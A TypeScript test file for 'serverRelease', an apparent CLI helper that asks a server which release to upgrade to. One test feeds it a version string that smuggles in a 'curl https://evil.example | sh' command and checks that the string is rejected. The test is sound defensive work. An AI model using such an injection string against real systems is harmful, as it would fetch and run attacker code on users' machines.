import { describe, expect, it } from "@effect/vitest"
import * as Effect from "effect/Effect"
import * as Option from "effect/Option"

import { fakeHttp } from "../testing"
import { serverRelease } from "./upgrade"

const origin = "https://pp.example.com"

const answering = (status: number, body: unknown) =>
  fakeHttp((url) =>
    url.pathname === "/api/cli/release"
      ? Response.json(body, { status })
      : new Response("not found", { status: 404 })
  )

describe("serverRelease", () => {
  it.effect("uses the release the server names", () =>
    Effect.gen(function* () {
      expect(yield* serverRelease(origin)).toEqual(Option.some("v2026.10.29"))
    }).pipe(Effect.provide(answering(200, { version: "v2026.10.29" })))
  )

  it.effect("falls back to the latest stable when the server has none", () =>
    Effect.gen(function* () {
      expect(yield* serverRelease(origin)).toEqual(Option.none())
    }).pipe(Effect.provide(answering(200, { version: null })))
  )

  it.effect("refuses a version that isn't a pp release", () =>
    Effect.gen(function* () {
      const failure = yield* Effect.flip(serverRelease(origin))
      expect(failure.code).toBe(8)
      expect(failure.message).toContain("isn't a pp release")
    }).pipe(
      Effect.provide(
        answering(200, { version: "v1'; curl https://evil.example | sh; '" })
      )
    )
  )

  it.effect("says so when the server can't be asked", () =>
    Effect.gen(function* () {
      const failure = yield* Effect.flip(serverRelease(origin))
      expect(failure.message).toContain("pp upgrade --latest")
    }).pipe(Effect.provide(answering(500, {})))
  )
})
